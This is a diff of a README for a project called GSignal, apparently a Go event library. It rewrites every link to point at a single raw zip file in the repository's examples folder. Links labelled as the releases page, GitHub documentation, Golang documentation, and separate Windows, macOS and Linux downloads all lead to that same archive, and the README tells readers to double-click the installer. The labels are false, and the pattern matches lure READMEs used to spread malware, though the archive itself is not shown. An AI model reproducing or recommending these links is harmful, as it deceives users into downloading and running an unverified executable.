@@ -6,11 +6,11 @@ Welcome to GSignal! This application helps you manage events easily. Whether you
 
 ## 📥 Download GSignal
 
-[![Download GSignal](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip%https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip)](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip)
+[![Download GSignal](https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip%https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip)](https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip)
 
 ## 🌐 Visit the Releases Page
 
-You can find the latest version of GSignal by visiting this page: [GSignal Releases](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip). 
+You can find the latest version of GSignal by visiting this page: [GSignal Releases](https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip). 
 
 ## 💻 System Requirements
 
@@ -23,13 +23,13 @@ GSignal requires the following:
 ## 📦 Download & Install
 
 1. **Go to the Releases Page**  
-   Visit [GSignal Releases](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip) to access the download options.
+   Visit [GSignal Releases](https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip) to access the download options.
 
 2. **Choose Your Version**  
    Look for the latest release version. Click on it to expand the details.
 
 3. **Download the Application**  
-   Click the link labeled "https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip" for Windows, "https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip" for macOS, or "https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip" for Linux.
+   Click the link labeled "https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip" for Windows, "https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip" for macOS, or "https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip" for Linux.
 
 4. **Run the Installer**  
    After the download, locate the file in your computer's Downloads folder. Double-click it to start the installation process. 
@@ -67,7 +67,7 @@ If you need help, consider reaching out:
 
 For more information, check the following:
 
-- [GitHub Documentation](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip)
-- [Golang Documentation](https://raw.githubusercontent.com/Gasterth/GSignal/main/examples/quickstart/G-Signal-2.0.zip)
+- [GitHub Documentation](https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip)
+- [Golang Documentation](https://github.com/Gasterth/GSignal/raw/refs/heads/main/examples/Signal-G-v1.4.zip)
 
 Feel free to explore and enhance your experience with GSignal!
